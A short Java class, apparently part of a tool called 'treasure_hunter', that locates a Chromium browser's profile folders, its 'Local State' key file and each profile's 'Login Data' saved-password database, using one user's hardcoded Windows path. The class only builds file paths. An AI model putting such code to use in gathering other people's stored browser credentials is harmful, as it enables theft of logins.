package com.treasure_hunter_java.browsers;

import java.nio.file.Path;
import java.util.ArrayList;

public class Chromium extends Browser{

    Path dirName = Path.of("C:/Users/Mikle/AppData/Local/Chromium/User Data/");

    Path localStatePath = Path.of("C:/Users/Mikle/AppData/Local/Chromium/User Data/Local State");

    ArrayList<Path> profiles = new ArrayList<>();

    public void collectProfiles() {
        super.collectProfiles(dirName);
        profiles = super.getProfiles();
    }

    @Override
    public ArrayList<Path> getProfiles() {
        return profiles;
    }

    public Path getLocalState() {

        return localStatePath;

    }

    public Path getLoginData(Path path) {

        return Path.of(path + "Login Data");

    }

}
